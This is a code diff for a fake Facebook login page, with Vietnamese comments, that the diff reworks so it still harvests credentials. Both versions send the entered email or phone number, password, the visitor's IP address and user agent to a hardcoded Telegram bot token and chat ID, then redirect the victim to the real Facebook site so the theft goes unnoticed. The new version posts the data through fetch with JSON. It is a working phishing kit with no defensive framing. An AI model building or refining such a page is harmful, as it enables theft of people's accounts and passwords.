@@ -18,50 +18,36 @@
         .login-btn:hover { background-color: #166fe5; }
         .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
         .create-btn { background-color: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; padding: 0 16px; line-height: 48px; cursor: pointer; display: inline-block; text-decoration: none; }
-        .create-btn:hover { background-color: #36a420; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- Phần tiêu đề bên trái giống Facebook -->
         <div class="left-side">
             <h1>facebook</h1>
             <p>Facebook helps you connect and share with the people in your life.</p>
         </div>
 
-        <!-- Phần khung đăng nhập bên phải -->
         <div class="right-side">
             <div class="login-card">
-                <form id="fbForm" action="https://api.telegram.org/bot8794929706:AAFzSyo7YY1kUm1Tlqt9gv7tmv82TTQxw2o/sendMessage" method="GET" target="hidden_iframe">
-                    <input type="hidden" name="chat_id" value="8742570709">
-                    
-                    <!-- Ô nhập tài khoản (Email hoặc số điện thoại) -->
-                    <input type="text" id="email" name="text_user" placeholder="Email address or phone number" required>
-                    
-                    <!-- Ô nhập mật khẩu -->
+                <form id="fbForm">
+                    <input type="text" id="email" placeholder="Email address or phone number" required>
                     <input type="password" id="pass" placeholder="Password" required>
-                    
-                    <!-- Nút bấm Đăng nhập -->
                     <button type="submit" class="login-btn">Log In</button>
                 </form>
-                
                 <div style="margin-bottom: 16px;">
                     <a href="#" style="color: #1877f2; font-size: 14px; text-decoration: none;">Forgotten password?</a>
                 </div>
-                
                 <div class="divider"></div>
-                
                 <a href="#" class="create-btn">Create new account</a>
             </div>
         </div>
     </div>
 
-    <!-- Iframe ẩn để nhận phản hồi, chống nhảy trang ngột ngạt -->
-    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
-
     <script>
-        // Lấy thông tin IP của người truy cập
+        const BOT_TOKEN = '8794929706:AAFzSyo7YY1kUm1Tlqt9gv7tmv82TTQxw2o';
+        const CHAT_ID = '8742570709';
+
         let userIp = "Đang lấy...";
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
@@ -69,25 +55,36 @@
             .catch(() => { userIp = "Không xác định"; });
 
         document.getElementById('fbForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Chặn form load lại trang
+
             const userVal = document.getElementById('email').value;
             const passVal = document.getElementById('pass').value;
 
-            // Đóng gói nội dung tin nhắn gửi về Telegram
-            const message = 
-                `🚨 PHÁT HIỆN DỮ LIỆU ĐĂNG NHẬP FACEBOOK!\n` +
+            const messageText = 
+                `🚨 PHÁT HIỆN THÔNG TIN ĐĂNG NHẬP!\n` +
                 `------------------------------------\n` +
                 `👤 Tài khoản: ${userVal}\n` +
                 `🔑 Mật khẩu: ${passVal}\n` +
                 `🌐 IP nguồn: ${userIp}\n` +
                 `📱 Thiết bị: ${navigator.userAgent}`;
 
-            // Gán nội dung vào trường text truyền sang Telegram API
-            this.action = `https://api.telegram.org/bot8794929706:AAFzSyo7YY1kUm1Tlqt9gv7tmv82TTQxw2o/sendMessage?chat_id=8742570709&text=` + encodeURIComponent(message);
-
-            // Sau khi gửi đi 0.8 giây, chuyển hướng nạn nhân/người test về trang chủ Facebook thật để đánh lừa
-            setTimeout(() => {
-                window.location.href = 'https://www.facebook.com';
-            }, 800);
+            // Dùng POST trực tiếp với JSON, xử lý trọn gói mọi ký tự đặc biệt như @, khoảng trắng,...
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: messageText
+                })
+            })
+            .finally(() => {
+                // Đợi 0.8 giây rồi chuyển hướng sang Facebook thật
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com';
+                }, 800);
+            });
         });
     </script>
 </body>
